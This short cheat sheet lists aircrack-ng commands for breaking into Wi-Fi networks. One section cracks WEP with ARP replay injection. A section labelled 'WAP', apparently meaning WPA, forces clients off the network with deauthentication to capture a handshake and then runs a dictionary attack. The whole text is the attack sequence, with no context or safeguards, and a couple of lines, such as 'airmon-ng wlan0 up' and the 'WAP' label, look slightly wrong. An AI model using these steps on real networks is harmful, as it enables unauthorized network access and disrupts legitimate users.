sudo iwlist wlan0 scan
sudo ifconfig wlan0 down
sudo  airmon-ng start wlan0 9

==================  WEP  ==================
ifconfig wlan0 up
airmon-ng wlan0 up
airodump-ng -w [filename] -c [channel] mon0
aireplay-ng -3 -b [AP's mac] -h [client's mac]
aircrack-ng [filename]

==================  WAP  ==================
ifconfig wlan0 up
#airmon-ng wlan0 up
airmon-ng <start|stop|check> <interface> [channel or frequency]
airodump-ng -w [filename] -c [channel] mon0
aireplay-ng -0 [1] -a [AP's mac] -h [client's mac] wlan0
aircrack-ng -w [dic] [filename]